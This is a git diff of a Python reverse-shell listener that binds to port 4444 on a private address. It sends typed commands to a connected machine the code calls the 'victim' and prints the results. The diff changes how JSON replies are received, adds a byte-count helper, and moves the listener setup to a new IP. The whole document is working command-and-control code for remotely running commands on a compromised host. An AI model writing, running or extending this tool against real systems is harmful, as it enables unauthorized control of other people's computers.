@@ -1,9 +1,12 @@
 import socket, sys, json
+from sys import getsizeof
 
 
 class Listener:
     
+    
     def __init__(self,ip,port):
+        #self.byteTotal = 0
         self.listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         self.listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
         self.listener.bind((str(ip),port)) #bind to this machine! 127.0.0.1 might work to? 
@@ -25,28 +28,32 @@ class Listener:
 
 
     def recvStream(self):
-        jsData = self.connection.recv(1024)
-        try:
-
-            return json.loads(jsData)
-        except Exception as e:
-            print('Could not process JSON')
-            print(e)
-            print('Raw byte data:\n\n')
-            return jsData
-
-
+        jsData = ''
+        #print(getsizeof(jsData))
+        while True:
+            try:
+                recvData = self.connection.recv(1024)
+                recvData = recvData.decode()
+                #print(getsizeof(jsData))
+                #byteSize = getsizeof(jsData)
+                #self.byteTotal += byteSize
+                jsData = jsData + recvData
+                return json.loads(jsData)
+            except Exception as e:
+                #print(e)
+                continue
+                
+    def utf8len(self,string):
+        return len(string.encode('utf-8'))
 
 
     def executeCmd(self,cmd):
         #cmd = str(cmd).encode('utf-8')
-        print('executeCmd')
-        print(cmd)
+        #print('executeCmd')
+        #print(cmd)
         self.sendStream(cmd)
         #result = self.connection.recv(1024)
         #result = result.decode()
-        print('Output from victim')
-        print('#'*100)
         return self.recvStream() #calling.executeCmd will return the result of the command sent by run()
 
 
@@ -60,18 +67,19 @@ class Listener:
                 else:
                     inputChecker = True
             if cmd != 'bye':
-                result = self.executeCmd(cmd) 
+                result = self.executeCmd(cmd)
+                print('Output from victim, {} bytes long'.format(self.utf8len(result)))
+                print('#'*100)
                 print(result)
+                print('#'*100)
             else:
                 print('Exit call received, closing connection')
                 self.listener.close()
                 sys.exit() 
           
 
-listener = Listener('10.211.55.5',4444)
-
-
 try:
+    listener = Listener('192.168.241.133',4444)
     listener.run()
 except KeyboardInterrupt:
     print('Interrupt caught, exiting...')
